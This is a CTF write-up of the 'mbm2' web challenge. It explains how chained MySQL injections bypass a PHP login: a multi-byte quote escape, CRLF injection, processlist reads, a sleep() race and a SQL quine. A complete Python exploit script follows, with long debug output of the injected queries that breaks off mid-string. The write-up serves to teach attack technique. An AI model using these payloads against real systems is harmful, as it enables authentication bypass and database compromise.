
Participated as dcua (#4)

I managed to solve the entire web category, but then I was not able to auth the mbm2 challenge. 

I will just explain how I solved the entire web category.


## mbm2
For the mbm2 challenge, I was able to pwn the service locally, but I didn't have enough time to exploit on the remote server. I wish I had 10 more minutes..

Since the challenge is very complicated, I will just summarize how it works.


### Stage 1: Gathering the information

Table name is member (as seen in the ```index.php``` file)

However the table is empty(WTF!!), therefore the hacker has to make a username , password, token with bypasses.

Now when we see the queries $r, $r2, $r3 we can conclude as follows:

1. $r: input=id // output=id,pw,token
2. $r2: input=token // output=id,token
3. $r3: input=id // output =id,pw

If we succeed to get enough outputs onto the three variables shown in above, there are five things to be checked in order to retrieve flag successfully:

1. check iff first_query[id] results "admin".
2. check iff second_query[id] results the same with the third_query[id]
3. check iff first_query[pw] results the $_POST['pw'] that you've given
4. check iff third_query[pw] results the $_POST['pw'] that you've given
5. check iff first_query[token] results the second_query[token] 
6. make sure second_token[*] does not have @ sign or _ sign.

Disclaimer: you need to keep in mind that these queries run on different variables and outputs different arrays of values in different variables. You need to chain sql injections so that all three queries execute and output successfully.


### Stage 2: The vulnerability

#### 2-1. execute union query 

The first vulnerability required was on the ```uid```, where you can only input max total length of 5. 
Since the ```mb_convert_encoding()``` is enabled, you can bypass the ```magic_quote_gpc()``` by a multi-byte sql injection.

Keep in mind that you need to comment/hash(#) right after the quote sign so that the query behind the quote signs are commented out.

At last, on the ```upw``` field you first need to insert ```CRLF``` to continue with your payload, and after that you will be able to inject your desirable payload on the first query.

#### 2-2. information_schema.processlist

The second vulnerability is triggered in the ```upw``` field with the ```information_schema.processlist``` selection.

the ```information_schema.processlist``` in mysql basically outputs the table of queries that are being executed on the server. You are required to select the data and parse your ```upw``` inputs to the result to satisfy such that the option 3 is completely bypassed.

#### 2-3. race condition with information_schema.processlist

With two vulnerability we've managed to bypass option 1,2,3.

However in option 4 we cannot ```select from processlist``` normally, and this is because the third query cannot select the first query because the first query is finishes the execution when the third query starts to select the appropriate data.

Because of this issue, you may have to do a race condtion by inserting ```sleep()``` function on the query, and this will eventually sleep the query and let the race condtion happen. Therefore you will be able to satisfy the option 4.

#### 2-4. SQL Quine 

Now the last two options - you cannot select information_schema or use global variables to copy your query. The only thing you can do at this stage is to use replace() function to quine the query. Since this is hard to explain, I will just follow up with the exploit code on the chapter 3.

(If I knew this method from the beginning ...I could've solved it in an easier way but anyways..)


### Stage 3: The exploit

The code below is the method  in which I've used for my local exploit... This will work in your server but I'm not sure if it works on the ctf service. 

The exploit code is as follows:

```
#!/usr/bin/python
'''
how to use
1) python pwn.py 1
2) python pwn.py 5
3) look at the "pwn.py 1" instance
'''

import urllib2
import urllib
import sys
import random
import time

# exploit 

# r_3id => id,pw
a= ("' union select (select substr(info,36,length(info)-36) from information_schema.processlist where db=database() and id=connection_id() limit 1), (select concat(substr(info,72,length(info)-75),0x312923) from information_schema.processlist where info like 0x2569642c70772c746f6b656e25 and time_ms>3 limit 1)#").encode("hex") 

# r2_token => id,token
b= ("' union select 0x" + a + ", REPLACE(REPLACE(REPLACE('\\\' union select 0x" + a + ", REPLACE(REPLACE(REPLACE(\"$\",CHAR(34),CHAR(39)),CHAR(36),\"$\"),CONCAT(CHAR(39),CHAR(39)),CONCAT(CHAR(39),CHAR(92),CHAR(39))) AS Quine#',CHAR(34),CHAR(39)),CHAR(36),'\\\' union select 0x" + a + ", REPLACE(REPLACE(REPLACE(\"$\",CHAR(34),CHAR(39)),CHAR(36),\"$\"),CONCAT(CHAR(39),CHAR(39)),CONCAT(CHAR(39),CHAR(92),CHAR(39))) AS Quine#'),CONCAT(CHAR(39),CHAR(39)),CONCAT(CHAR(39),CHAR(92),CHAR(39))) AS Quine#").encode("hex")

#r1_id => id,pw,token
c= ("+union+select+0x61646d696e,substr(info,72,length(info)-72),0x" + b + "+from+information_schema.processlist+where+db=database()+and+id=connection_id()+limit+1+union+select+1,2,sleep(" + sys.argv[1] + ")%23") 

payload = "uid=%BF%27%0A%23&upw=%0A" + c

temp = ""
while 1:
    #request_packet = urllib2.Request("http://ctf.leaveret.kr/go/37a6f7a829e19a70e85c8eca53489439/?page=login_chk", payload)
    request_packet = urllib2.Request("http://????????/?uid=%BF%27%0A%23&upw=%0A" + c)
    request_packet.add_header('Cookie', 'PHPSESSID=boa65u1m96ton8ri9ros5qhjl2;')
    request_data = urllib2.urlopen(request_packet)
    request_data = request_data.read()
    #print(request_data)
    #sys.exit(0)
    if(request_data == temp):
        temp = request_data
    elif not temp:
        temp = request_data
    else:
        print(request_data)
        sys.exit(0)
```
The results are as follows:
```
[!] ERROR CHK: 
[*] QUERY RUN: select id,pw,token from member where id='?'
#' and 'chk'='chk' and pw='
 union select 0x61646d696e,substr(info,72,length(info)-72),0x2720756e696f6e2073656c656374203078323732303735366536393666366532303733363536633635363337343230323837333635366336353633373432303733373536323733373437323238363936653636366632633333333632633663363536653637373436383238363936653636366632393264333333363239323036363732366636643230363936653636366637323664363137343639366636653566373336333638363536643631326537303732366636333635373337333663363937333734323037373638363537323635323036343632336436343631373436313632363137333635323832393230363136653634323036393634336436333666366536653635363337343639366636653566363936343238323932303663363936643639373432303331323932633230323837333635366336353633373432303633366636653633363137343238373337353632373337343732323836393665363636663263333733323263366336353665363737343638323836393665363636663239326433373335323932633330373833333331333233393332333332393230363637323666366432303639366536363666373236643631373436393666366535663733363336383635366436313265373037323666363336353733373336633639373337343230373736383635373236353230363936653636366632303663363936623635323033303738333233353336333933363334333236333337333033373337333236333337333433363636333636323336333533363635333233353230363136653634323037343639366436353566366437333365333332303663363936643639373432303331323932332c205245504c414345285245504c414345285245504c41434528275c2720756e696f6e2073656c656374203078323732303735366536393666366532303733363536633635363337343230323837333635366336353633373432303733373536323733373437323238363936653636366632633333333632633663363536653637373436383238363936653636366632393264333333363239323036363732366636643230363936653636366637323664363137343639366636653566373336333638363536643631326537303732366636333635373337333663363937333734323037373638363537323635323036343632336436343631373436313632363137333635323832393230363136653634323036393634336436333666366536653635363337343639366636653566363936343238323932303663363936643639373432303331323932633230323837333635366336353633373432303633366636653633363137343238373337353632373337343732323836393665363636663263333733323263366336353665363737343638323836393665363636663239326433373335323932633330373833333331333233393332333332393230363637323666366432303639366536363666373236643631373436393666366535663733363336383635366436313265373037323666363336353733373336633639373337343230373736383635373236353230363936653636366632303663363936623635323033303738333233353336333933363334333236333337333033373337333236333337333433363636333636323336333533363635333233353230363136653634323037343639366436353566366437333365333332303663363936643639373432303331323932332c205245504c414345285245504c414345285245504c414345282224222c43484152283334292c4348415228333929292c43484152283336292c222422292c434f4e4341542843484152283339292c4348415228333929292c434f4e4341542843484152283339292c43484152283932292c43484152283339292929204153205175696e6523272c43484152283334292c4348415228333929292c43484152283336292c275c2720756e696f6e2073656c656374203078323732303735366536393666366532303733363536633635363337343230323837333635366336353633373432303733373536323733373437323238363936653636366632633333333632633663363536653637373436383238363936653636366632393264333333363239323036363732366636643230363936653636366637323664363137343639366636653566373336333638363536643631326537303732366636333635373337333663363937333734323037373638363537323635323036343632336436343631373436313632363137333635323832393230363136653634323036393634336436333666366536653635363337343639366636653566363936343238323932303663363936643639373432303331323932633230323837333635366336353633373432303633366636653633363137343238373337353632373337343732323836393665363636663263333733323263366336353665363737343638323836393665363636663239326433373335323932633330373833333331333233393332333332393230363637323666366432303639366536363666373236643631373436393666366535663733363336383635366436313265373037323666363336353733373336633639373337343230373736383635373236353230363936653636366632303663363936623635323033303738333233353336333933363334333236333337333033373337333236333337333433363636333636323336333533363635333233353230363136653634323037343639366436353566366437333365333332303663363936643639373432303331323932332c205245504c414345285245504c414345285245504c414345282224222c43484152283334292c4348415228333929292c43484152283336292c222422292c434f4e4341542843484152283339292c4348415228333929292c434f4e4341542843484152283339292c43484152283932292c43484152283339292929204153205175696e652327292c434f4e4341542843484152283339292c4348415228333929292c434f4e4341542843484152283339292c43484152283932292c43484152283339292929204153205175696e6523 from information_schema.processlist where db=database() and id=connection_id() limit 1 union select 1,2,sleep(1)#'
$r = Array
(
    [0] => admin
    [id] => admin
    [1] => 
 union select 0x61646d696e,substr(info,72,length(info)-72),0x2720756e696f6e2073656c656374203078323732303735366536393666366532303733363536633635363337343230323837333635366336353633373432303733373536323733373437323238363936653636366632633333333632633663363536653637373436383238363936653636366632393264333333363239323036363732366636643230363936653636366637323664363137343639366636653566373336333638363536643631326537303732366636333635373337333663363937333734323037373638363537323635323036343632336436343631373436313632363137333635323832393230363136653634323036393634336436333666366536653635363337343639366636653566363936343238323932303663363936643639373432303331323932633230323837333635366336353633373432303633366636653633363137343238373337353632373337343732323836393665363636663263333733323263366336353665363737343638323836393665363636663239326433373335323932633330373833333331333233393332333332393230363637323666366432303639366536363666373236643631373436393666366535663733363336383635366436313265373037323666363336353733373336633639373337343230373736383635373236353230363936653636366632303663363936623635323033303738333233353336333933363334333236333337333033373337333236333337333433363636333636323336333533363635333233353230363136653634323037343639366436353566366437333365333332303663363936643639373432303331323932332c205245504c414345285245504c414345285245504c41434528275c2720756e696f6e2073656c656374203078323732303735366536393666366532303733363536633635363337343230323837333635366336353633373432303733373536323733373437323238363936653636366632633333333632633663363536653637373436383238363936653636366632393264333333363239323036363732366636643230363936653636366637323664363137343639366636653566373336333638363536643631326537303732366636333635373337333663363937333734323037373638363537323635323036343632336436343631373436313632363137333635323832393230363136653634323036393634336436333666366536653635363337343639366636653566363936343238323932303663363936643639373432303331323932633230323837333635366336353633373432303633366636653633363137343238373337353632373337343732323836393665363636663263333733323263366336353665363737343638323836393665363636663239326433373335323932633330373833333331333233393332333332393230363637323666366432303639366536363666373236643631373436393666366535663733363336383635366436313265373037323666363336353733373336633639373337343230373736383635373236353230363936653636366632303663363936623635323033303738333233353336333933363334333236333337333033373337333236333337333433363636333636323336333533363635333233353230363136653634323037343639366436353566366437333365333332303663363936643639373432303331323932332c205245504c414345285245504c414345285245504c414345282224222c43484152283334292c4348415228333929292c43484152283336292c222422292c434f4e4341542843484152283339292c4348415228333929292c434f4e4341542843484152283339292c43484152283932292c43484152283339292929204153205175696e6523272c43484152283334292c4348415228333929292c43484152283336292c275c2720756e696f6e2073656c656374203078323732303735366536393666366532303733363536633635363337343230323837333635366336353633373432303733373536323733373437323238363936653636366632633333333632633663363536653637373436383238363936653636366632393264333333363239323036363732366636643230363936653636366637323664363137343639366636653566373336333638363536643631326537303732366636333635373337333663363937333734323037373638363537323635323036343632336436343631373436313632363137333635323832393230363136653634323036393634336436333666366536653635363337343639366636653566363936343238323932303663363936643639373432303331323932633230323837333635366336353633373432303633366636653633363137343238373337353632373337343732323836393665363636663263333733323263366336353665363737343638323836393665363636663239326433373335323932633330373833333331333233393332333332393230363637323666366432303639366536363666373236643631373436393666366535663733363336383635366436313265373037323666363336353733373336633639373337343230373736383635373236353230363936653636366632303663363936623635323033303738333233353336333933363334333236333337333033373337333236333337333433363636333636323336333533363635333233353230363136653634323037343639366436353566366437333365333332303663363936643639373432303331323932332c205245504c414345285245504c414345285245504c414345282224222c43484152283334292c4348415228333929292c43484152283336292c222422292c434f4e4341542843484152283339292c4348415228333929292c434f4e4341542843484152283339292c43484152283932292c43484152283339292929204153205175696e652327292c434f4e4341542843484152283339292c4348415228333929292c434f4e4341542843484152283339292c43484152283932292c43484152283339292929204153205175696e6523 from information_schema.processlist where db=database() and id=connection_id() limit 1 union select 1,2,sleep(1)#
    [pw] => 
 union select 0x61646d696e,substr(info,72,length(info)-72),0x2720756e696f6e2073656c656374203078323732303735366536393666366532303733363536633635363337343230323837333635366336353633373432303733373536323733373437323238363936653636366632633333333632633663363536653637373436383238363936653636366632393264333333363239323036363732366636643230363936653636366637323664363137343639366636653566373336333638363536643631326537303732366636333635373337333663363937333734323037373638363537323635323036343632336436343631373436313632363137333635323832393230363136653634323036393634336436333666366536653635363337343639366636653566363936343238323932303663363936643639373432303331323932633230323837333635366336353633373432303633366636653633363137343238373337353632373337343732323836393665363636663263333733323263366336353665363737343638323836393665363636663239326433373335323932633330373833333331333233393332333332393230363637323666366432303639366536363666373236643631373436393666366535663733363336383635366436313265373037323666363336353733373336633639373337343230373736383635373236353230363936653636366632303663363936623635323033303738333233353336333933363334333236333337333033373337333236333337333433363636333636323336333533363635333233353230363136653634323037343639366436353566366437333365333332303663363936643639373432303331323932332c205245504c414345285245504c414345285245504c41434528275c2720756e696f6e2073656c656374203078323732303735366536393666366532303733363536633635363337343230323837333635366336353633373432303733373536323733373437323238363936653636366632633333333632633663363536653637373436383238363936653636366632393264333333363239323036363732366636643230363936653636366637323664363137343639366636653566373336333638363536643631326537303732366636333635373337333663363937333734323037373638363537323635323036343632336436343631373436313632363137333635323832393230363136653634323036393634336436333666366536653635363337343639366636653566363936343238323932303663363936643639373432303331323932633230323837333635366336353633373432303633366636653633363137343238373337353632373337343732323836393665363636663263333733323263366336353665363737343638323836393665363636663239326433373335323932633330373833333331333233393332333332393230363637323666366432303639366536363666373236643631373436393666366535663733363336383635366436313265373037323666363336353733373336633639373337343230373736383635373236353230363936653636366632303663363936623635323033303738333233353336333933363334333236333337333033373337333236333337333433363636333636323336333533363635333233353230363136653634323037343639366436353566366437333365333332303663363936643639373432303331323932332c205245504c414345285245504c414345285245504c414345282224222c43484152283334292c4348415228333929292c43484152283336292c222422292c434f4e4341542843484152283339292c4348415228333929292c434f4e4341542843484152283339292c43484152283932292c43484152283339292929204153205175696e6523272c43484152283334292c4348415228333929292c43484152283336292c275c2720756e696f6e2073656c656374203078323732303735366536393666366532303733363536633635363337343230323837333635366336353633373432303733373536323733373437323238363936653636366632633333333632633663363536653637373436383238363936653636366632393264333333363239323036363732366636643230363936653636366637323664363137343639366636653566373336333638363536643631326537303732366636333635373337333663363937333734323037373638363537323635323036343632336436343631373436313632363137333635323832393230363136653634323036393634336436333666366536653635363337343639366636653566363936343238323932303663363936643639373432303331323932633230323837333635366336353633373432303633366636653633363137343238373337353632373337343732323836393665363636663263333733323263366336353665363737343638323836393665363636663239326433373335323932633330373833333331333233393332333332393230363637323666366432303639366536363666373236643631373436393666366535663733363336383635366436313265373037323666363336353733373336633639373337343230373736383635373236353230363936653636366632303663363936623635323033303738333233353336333933363334333236333337333033373337333236333337333433363636333636323336333533363635333233353230363136653634323037343639366436353566366437333365333332303663363936643639373432303331323932332c205245504c414345285245504c414345285245504c414345282224222c43484152283334292c4348415228333929292c43484152283336292c222422292c434f4e4341542843484152283339292c4348415228333929292c434f4e4341542843484152283339292c43484152283932292c43484152283339292929204153205175696e652327292c434f4e4341542843484152283339292c4348415228333929292c434f4e4341542843484152283339292c43484152283932292c43484152283339292929204153205175696e6523 from information_schema.processlist where db=database() and id=connection_id() limit 1 union select 1,2,sleep(1)#
    [2] => ' union select 0x2720756e696f6e2073656c656374202873656c6563742073756273747228696e666f2c33362c6c656e67746828696e666f292d3336292066726f6d20696e666f726d6174696f6e5f736368656d612e70726f636573736c6973742077686572652064623d6461746162617365282920616e642069643d636f6e6e656374696f6e5f69642829206c696d69742031292c202873656c65637420636f6e6361742873756273747228696e666f2c37322c6c656e67746828696e666f292d3735292c3078333132393233292066726f6d20696e666f726d6174696f6e5f736368656d612e70726f636573736c69737420776865726520696e666f206c696b65203078323536393634326337303737326337343666366236353665323520616e642074696d655f6d733e33206c696d697420312923, REPLACE(REPLACE(REPLACE('\' union select 0x2720756e696f6e2073656c656374202873656c6563742073756273747228696e666f2c33362c6c656e67746828696e666f292d3336292066726f6d20696e666f726d6174696f6e5f736368656d612e70726f636573736c6973742077686572652064623d6461746162617365282920616e642069643d636f6e6e656374696f6e5f69642829206c696d69742031292c202873656c65637420636f6e6361742873756273747228696e666f2c37322c6c656e67746828696e666f292d3735292c3078333132393233292066726f6d20696e666f726d6174696f6e5f736368656d612e70726f636573736c69737420776865726520696e666f206c696b65203078323536393634326337303737326337343666366236353665323520616e642074696d655f6d733e33206c696d697420312923, REPLACE(REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$"),CONCAT(CHAR(39),CHAR(39)),CONCAT(CHAR(39),CHAR(92),CHAR(39))) AS Quine#',CHAR(34),CHAR(39)),CHAR(36),'\' union select 0x2720756e696f6e2073656c656374202873656c6563742073756273747228696e666f2c33362c6c656e67746828696e666f292d3336292066726f6d20696e666f726d6174696f6e5f736368656d612e70726f636573736c6973742077686572652064623d6461746162617365282920616e642069643d636f6e6e656374696f6e5f69642829206c696d69742031292c202873656c65637420636f6e6361742873756273747228696e666f2c37322c6c656e67746828696e666f292d3735292c3078333132393233292066726f6d20696e666f726d6174696f6e5f736368656d612e70726f636573736c69737420776865726520696e666f206c696b65203078323536393634326337303737326337343666366236353665323520616e642074696d655f6d733e33206c696d697420312923, REPLACE(REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$"),CONCAT(CHAR(39),CHAR(39)),CONCAT(CHAR(39),CHAR(92),CHAR(39))) AS Quine#'),CONCAT(CHAR(39),CHAR(39)),CONCAT(CHAR(39),CHAR(92),CHAR(39))) AS Quine#
    [token] => ' union select 0x2720756e696f6e2073656c656374202873656c6563742073756273747228696e666f2c33362c6c656e67746828696e666f292d3336292066726f6d20696e666f726d6174696f6e5f736368656d612e70726f636573736c6973742077686572652064623d6461746162617365282920616e642069643d636f6e6e656374696f6e5f69642829206c696d69742031292c202873656c65637420636f6e6361742873756273747228696e666f2c37322c6c656e67746828696e666f292d3735292c3078333132393233292066726f6d20696e666f726d6174696f6e5f736368656d612e70726f636573736c69737420776865726520696e666f206c696b65203078323536393634326337303737326337343666366236353665323520616e642074696d655f6d733e33206c696d697420312923, REPLACE(REPLACE(REPLACE('\' union select 0x2720756e696f6e2073656c656374202873656c6563742073756273747228696e666f2c33362c6c656e67746828696e666f292d3336292066726f6d20696e666f726d6174696f6e5f736368656d612e70726f636573736c6973742077686572652064623d6461746162617365282920616e642069643d636f6e6e656374696f6e5f69642829206c696d69742031292c202873656c65637420636f6e6361742873756273747228696e666f2c37322c6c656e67746828696e666f292d3735292c3078333132393233292066726f6d20696e666f726d6174696f6e5f736368656d612e70726f636573736c69737420776865726520696e666f206c696b65203078323536393634326337303737326337343666366236353665323520616e642074696d655f6d733e33206c696d697420312923, REPLACE(REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$"),CONCAT(CHAR(39),CHAR(39)),CONCAT(CHAR(39),CHAR(92),CHAR(39))) AS Quine#',CHAR(34),CHAR(39)),CHAR(36),'\' union select 0x2720756e696f6e2073656c656374202873656c6563742073756273747228696e666f2c33362c6c656e67746828696e666f292d3336292066726f6d20696e666f726d6174696f6e5f736368656d612e70726f636573736c6973742077686572652064623d6461746162617365282920616e642069643d636f6e6e656374696f6e5f69642829206c696d69742031292c202873656c65637420636f6e6361742873756273747228696e666f2c37322c6c656e67746828696e666f292d3735292c3078333132393233292066726f6d20696e666f726d6174696f6e5f736368656d612e70726f636573736c69737420776865726520696e666f206c696b65203078323536393634326337303737326337343666366236353665323520616e642074696d655f6d733e33206c696d697420312923, REPLACE(REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$"),CONCAT(CHAR(39),CHAR(39)),CONCAT(CHAR(39),CHAR(92),CHAR(39))) AS Quine#'),CONCAT(CHAR(39),CHAR(39)),CONCAT(CHAR(39),CHAR(92),CHAR(39))) AS Quine#
)
[!] ERROR CHK: 
$r2 = Array
(
    [0] => ' union select (select substr(info,36,length(info)-36) from information_schema.processlist where db=database() and id=connection_id() limit 1), (select concat(substr(info,72,length(info)-75),0x312923) from information_schema.processlist where info like 0x2569642c70772c746f6b656e25 and time_ms>3 limit 1)#
    [id] => ' union select (select substr(info,36,length(info)-36) from information_schema.processlist where db=database() and id=connection_id() limit 1), (select concat(substr(info,72,length(info)-75),0x312923) from information_schema.processlist where info like 0x2569642c70772c746f6b656e25 and time_ms>3 limit 1)#
    [1] => ' union select 0x2720756e696f6e2073656c656374202873656c6563742073756273747228696e666f2c33362c6c656e67746828696e666f292d3336292066726f6d20696e666f726d6174696f6e5f736368656d612e70726f636573736c6973742077686572652064623d6461746162617365282920616e642069643d636f6e6e656374696f6e5f69642829206c696d69742031292c202873656c65637420636f6e6361742873756273747228696e666f2c37322c6c656e67746828696e666f292d3735292c3078333132393233292066726f6d20696e666f726d6174696f6e5f736368656d612e70726f636573736c69737420776865726520696e666f206c696b65203078323536393634326337303737326337343666366236353665323520616e642074696d655f6d733e33206c696d697420312923, REPLACE(REPLACE(REPLACE('\' union select 0x2720756e696f6e2073656c656374202873656c6563742073756273747228696e666f2c33362c6c656e67746828696e666f292d3336292066726f6d20696e666f726d6174696f6e5f736368656d612e70726f636573736c6973742077686572652064623d6461746162617365282920616e642069643d636f6e6e656374696f6e5f69642829206c696d69742031292c202873656c65637420636f6e6361742873756273747228696e666f2c37322c6c656e67746828696e666f292d3735292c3078333132393233292066726f6d20696e666f726d6174696f6e5f736368656d612e70726f636573736c69737420776865726520696e666f206c696b65203078323536393634326337303737326337343666366236353665323520616e642074696d655f6d733e33206c696d697420312923, REPLACE(REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$"),CONCAT(CHAR(39),CHAR(39)),CONCAT(CHAR(39),CHAR(92),CHAR(39))) AS Quine#',CHAR(34),CHAR(39)),CHAR(36),'\' union select 0x2720756e696f6e2073656c656374202873656c6563742073756273747228696e666f2c33362c6c656e67746828696e666f292d3336292066726f6d20696e666f726d6174696f6e5f736368656d612e70726f636573736c6973742077686572652064623d6461746162617365282920616e642069643d636f6e6e656374696f6e5f69642829206c696d69742031292c202873656c65637420636f6e6361742873756273747228696e666f2c37322c6c656e67746828696e666f292d3735292c3078333132393233292066726f6d20696e666f726d6174696f6e5f736368656d612e70726f636573736c69737420776865726520696e666f206c696b65203078323536393634326337303737326337343666366236353665323520616e642074696d655f6d733e33206c696d697420312923, REPLACE(REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$"),CONCAT(CHAR(39),CHAR(39)),CONCAT(CHAR(39),CHAR(92),CHAR(39))) AS Quine#'),CONCAT(CHAR(39),CHAR(39)),CONCAT(CHAR(39),CHAR(92),CHAR(39))) AS Quine#
    [token] => ' union select 0x2720756e696f6e2073656c656374202873656c6563742073756273747228696e666f2c33362c6c656e67746828696e666f292d3336292066726f6d20696e666f726d6174696f6e5f736368656d612e70726f636573736c6973742077686572652064623d6461746162617365282920616e642069643d636f6e6e656374696f6e5f69642829206c696d69742031292c202873656c65637420636f6e6361742873756273747228696e666f2c37322c6c656e67746828696e666f292d3735292c3078333132393233292066726f6d20696e666f726d6174696f6e5f736368656d612e70726f636573736c69737420776865726520696e666f206c696b65203078323536393634326337303737326337343666366236353665323520616e642074696d655f6d733e33206c696d697420312923, REPLACE(REPLACE(REPLACE('\' union select 0x2720756e696f6e2073656c656374202873656c6563742073756273747228696e666f2c33362c6c656e67746828696e666f292d3336292066726f6d20696e666f726d6174696f6e5f736368656d612e70726f636573736c6973742077686572652064623d6461746162617365282920616e642069643d636f6e6e656374696f6e5f69642829206c696d69742031292c202873656c65637420636f6e6361742873756273747228696e666f2c37322c6c656e67746828696e666f292d3735292c3078333132393233292066726f6d20696e666f726d6174696f6e5f736368656d612e70726f636573736c69737420776865726520696e666f206c696b65203078323536393634326337303737326337343666366236353665323520616e642074696d655f6d733e33206c696d697420312923, REPLACE(REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$"),CONCAT(CHAR(39),CHAR(39)),CONCAT(CHAR(39),CHAR(92),CHAR(39))) AS Quine#',CHAR(34),CHAR(39)),CHAR(36),'\' union select 0x2720756e696f6e2073656c656374202873656c6563742073756273747228696e666f2c33362c6c656e67746828696e666f292d3336292066726f6d20696e666f726d6174696f6e5f736368656d612e70726f636573736c6973742077686572652064623d6461746162617365282920616e642069643d636f6e6e656374696f6e5f69642829206c696d69742031292c202873656c65637420636f6e6361742873756273747228696e666f2c37322c6c656e67746828696e666f292d3735292c3078333132393233292066726f6d20696e666f726d6174696f6e5f736368656d612e70726f636573736c69737420776865726520696e666f206c696b65203078323536393634326337303737326337343666366236353665323520616e642074696d655f6d733e33206c696d697420312923, REPLACE(REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$"),CONCAT(CHAR(39),CHAR(39)),CONCAT(CHAR(39),CHAR(92),CHAR(39))) AS Quine#'),CONCAT(CHAR(39),CHAR(39)),CONCAT(CHAR(39),CHAR(92),CHAR(39))) AS Quine#
)
[!] ERROR CHK: 
$r3 = Array
(
    [0] => ' union select (select substr(info,36,length(info)-36) from information_schema.processlist where db=database() and id=connection_id() limit 1), (select concat(substr(info,72,length(info)-75),0x312923) from information_schema.processlist where info like 0x2569642c70772c746f6b656e25 and time_ms>3 limit 1)#
    [id] => ' union select (select substr(info,36,length(info)-36) from information_schema.processlist where db=database() and id=connection_id() limit 1), (select concat(substr(info,72,length(info)-75),0x312923) from information_schema.processlist where info like 0x2569642c70772c746f6b656e25 and time_ms>3 limit 1)#
    [1] => 
 union select 0x61646d696e,substr(info,72,length(info)-72),0x2720756e696f6e2073656c656374203078323732303735366536393666366532303733363536633635363337343230323837333635366336353633373432303733373536323733373437323238363936653636366632633333333632633663363536653637373436383238363936653636366632393264333333363239323036363732366636643230363936653636366637323664363137343639366636653566373336333638363536643631326537303732366636333635373337333663363937333734323037373638363537323635323036343632336436343631373436313632363137333635323832393230363136653634323036393634336436333666366536653635363337343639366636653566363936343238323932303663363936643639373432303331323932633230323837333635366336353633373432303633366636653633363137343238373337353632373337343732323836393665363636663263333733323263366336353665363737343638323836393665363636663239326433373335323932633330373833333331333233393332333332393230363637323666366432303639366536363666373236643631373436393666366535663733363336383635366436313265373037323666363336353733373336633639373337343230373736383635373236353230363936653636366632303663363936623635323033303738333233353336333933363334333236333337333033373337333236333337333433363636333636323336333533363635333233353230363136653634323037343639366436353566366437333365333332303663363936643639373432303331323932332c205245504c414345285245504c414345285245504c41434528275c2720756e696f6e2073656c656374203078323732303735366536393666366532303733363536633635363337343230323837333635366336353633373432303733373536323733373437323238363936653636366632633333333632633663363536653637373436383238363936653636366632393264333333363239323036363732366636643230363936653636366637323664363137343639366636653566373336333638363536643631326537303732366636333635373337333663363937333734323037373638363537323635323036343632336436343631373436313632363137333635323832393230363136653634323036393634336436333666366536653635363337343639366636653566363936343238323932303663363936643639373432303331323932633230323837333635366336353633373432303633366636653633363137343238373337353632373337343732323836393665363636663263333733323263366336353665363737343638323836393665363636663239326433373335323932633330373833333331333233393332333332393230363637323666366432303639366536363666373236643631373436393666366535663733363336383635366436313265373037323666363336353733373336633639373337343230373736383635373236353230363936653636366632303663363936623635323033303738333233353336333933363334333236333337333033373337333236333337333433363636333636323336333533363635333233353230363136653634323037343639366436353566366437333365333332303663363936643639373432303331323932332c205245504c414345285245504c414345285245504c414345282224222c43484152283334292c4348415228333929292c43484152283336292c222422292c434f4e4341542843484152283339292c4348415228333929292c434f4e4341542843484152283339292c43484152283932292c43484152283339292929204153205175696e6523272c43484152283334292c4348415228333929292c43484152283336292c275c2720756e696f6e2073656c656374203078323732303735366536393666366532303733363536633635363337343230323837333635366336353633373432303733373536323733373437323238363936653636366632633333333632633663363536653637373436383238363936653636366632393264333333363239323036363732366636643230363936653636366637323664363137343639366636653566373336333638363536643631326537303732366636333635373337333663363937333734323037373638363537323635323036343632336436343631373436313632363137333635323832393230363136653634323036393634336436333666366536653635363337343639366636653566363936343238323932303663363936643639373432303331323932633230323837333635366336353633373432303633366636653633363137343238373337353632373337343732323836393665363636663263333733323263366336353665363737343638323836393665363636663239326433373335323932633330373833333331333233393332333332393230363637323666366432303639366536363666373236643631373436393666366535663733363336383635366436313265373037323666363336353733373336633639373337343230373736383635373236353230363936653636366632303663363936623635323033303738333233353336333933363334333236333337333033373337333236333337333433363636333636323336333533363635333233353230363136653634323037343639366436353566366437333365333332303663363936643639373432303331323932332c205245504c414345285245504c414345285245504c414345282224222c43484152283334292c4348415228333929292c43484152283336292c222422292c434f4e4341542843484152283339292c4348415228333929292c434f4e4341542843484152283339292c43484152283932292c43484152283339292929204153205175696e652327292c434f4e4341542843484152283339292c4348415228333929292c434f4e4341542843484152283339292c43484152283932292c43484152283339292929204153205175696e6523 from information_schema.processlist where db=database() and id=connection_id() limit 1 union select 1,2,sleep(1)#
    [pw] => 
 union select 0x61646d696e,substr(info,72,length(info)-72),0x2720756e696f6e2073656c656374203078323732303735366536393666366532303733363536633635363337343230323837333635366336353633373432303733373536323733373437323238363936653636366632633333333632633663363536653637373436383238363936653636366632393264333333363239323036363732366636643230363936653636366637323664363137343639366636653566373336333638363536643631326537303732366636333635373337333663363937333734323037373638363537323635323036343632336436343631373436313632363137333635323832393230363136653634323036393634336436333666366536653635363337343639366636653566363936343238323932303663363936643639373432303331323932633230323837333635366336353633373432303633366636653633363137343238373337353632373337343732323836393665363636663263333733323263366336353665363737343638323836393665363636663239326433373335323932633330373833333331333233393332333332393230363637323666366432303639366536363666373236643631373436393666366535663733363336383635366436313265373037323666363336353733373336633639373337343230373736383635373236353230363936653636366632303663363936623635323033303738333233353336333933363334333236333337333033373337333236333337333433363636333636323336333533363635333233353230363136653634323037343639366436353566366437333365333332303663363936643639373432303331323932332c205245504c414345285245504c414345285245504c41434528275c2720756e696f6e2073656c6563742030783237323037353665363936663665323037333635366336353633373432303238373336353663363536333734323037333735363237333734373232383639366536363666326333333336326336633635366536373734363832383639366536363666323932643333333632393230363637323666366432303639366536363666373236643631373436393666366535663733363336383635366436313265373037323666363336353733373336633639373337343230373736383635373236353230363436323364363436313734363136323631373336353238323932303631366536343230363936343364363336663665366536353633373436393666366535663639363432383239323036633639366436393734323033313239326332303238373336353663363536333734323036333666366536333631373432383733373536323733373437323238363936653636366632633337333232633663363536653637373436383238363936653636366632393264333733353239326333303738333333313332333933323333323932303636373236663664323036